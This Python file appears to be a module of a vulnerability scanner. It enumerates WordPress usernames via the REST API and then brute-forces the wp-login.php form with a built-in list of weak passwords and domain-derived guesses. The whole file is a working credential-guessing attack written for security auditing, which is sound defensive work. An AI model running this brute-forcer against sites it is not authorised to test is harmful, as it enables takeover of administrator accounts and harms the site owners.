#!/usr/bin/env python3
import copy
import datetime
from typing import List

from karton.core import Task

from artemis import ip_utils, load_risk_class, utils
from artemis.binds import TaskStatus, TaskType, WebApplication
from artemis.config import Config
from artemis.module_base import ArtemisBase

PASSWORDS = [
    "admin",
    "administrator",
    "admin1",
    "wordpress",
    "password",
    "haslo",
    "1234",
    "12345",
    "123456",
    "123456789",
    "qwerty",
    "zaq123wsx",
]

MAX_USERNAMES_TO_CHECK = 3


@load_risk_class.load_risk_class(load_risk_class.LoadRiskClass.MEDIUM)
class WordPressBruter(ArtemisBase):
    """
    Performs a brute-force attack on WordPress credentials.
    """

    identity = "wordpress_bruter"
    filters = [
        {"type": TaskType.WEBAPP.value, "webapp": WebApplication.WORDPRESS.value},
    ]

    def get_passwords(self, current_task: Task) -> List[str]:
        passwords = copy.copy(PASSWORDS)
        host = utils.get_host_from_url(current_task.get_payload("url"))

        if not ip_utils.is_ip_address(host):
            domain_items = host.split(".")
            while domain_items and domain_items[0] in Config.Modules.WordPressBruter.WORDPRESS_BRUTER_STRIPPED_PREFIXES:
                domain_items = domain_items[1:]

            if domain_items:
                site_name = domain_items[0]

                passwords.append(site_name + "123")
                passwords.append(site_name + "1")
                for year_relative in [0, -1, -2, -3]:
                    passwords.append(site_name + str(datetime.datetime.now().year + year_relative))
        return passwords

    def run(self, current_task: Task) -> None:
        url = current_task.get_payload("url")

        usernames = []

        try:
            users = self.http_get(url + "?rest_route=/wp/v2/users").json()
            for user_entry in users:
                usernames.append(user_entry["name"])
        except Exception:
            pass

        usernames += ["admin", "administrator", "wordpress"]
        usernames = usernames[:MAX_USERNAMES_TO_CHECK]

        passwords = self.get_passwords(current_task)

        self.log.info("Brute-forcing %s with usernames=%s passwords=%s", url, usernames, passwords)

        credentials = []
        for username in usernames:
            for password in passwords:
                content = self.http_post(
                    url + "/wp-login.php",
                    data={
                        "log": username,
                        "pwd": password,
                        "wp-submit": "Log In",
                        "redirect_to": "http://127.0.0.1:8080/wp-admin/",
                        "testcookie": "1",
                    },
                    cookies={"wordpress_test_cookie": "WP%20Cookie%20check"},
                ).content
                if "<title>Dashboard" in content or '<form class="admin-email-confirm-form"' in content:
                    credentials.append((username, password))

        if credentials:
            status = TaskStatus.INTERESTING
            status_reason = "Found working credentials for the WordPress admin: " + ", ".join(
                sorted([username + ":" + password for username, password in credentials])
            )
        else:
            status = TaskStatus.OK
            status_reason = None
        self.db.save_task_result(task=current_task, status=status, status_reason=status_reason, data=credentials)


if __name__ == "__main__":
    WordPressBruter().loop()
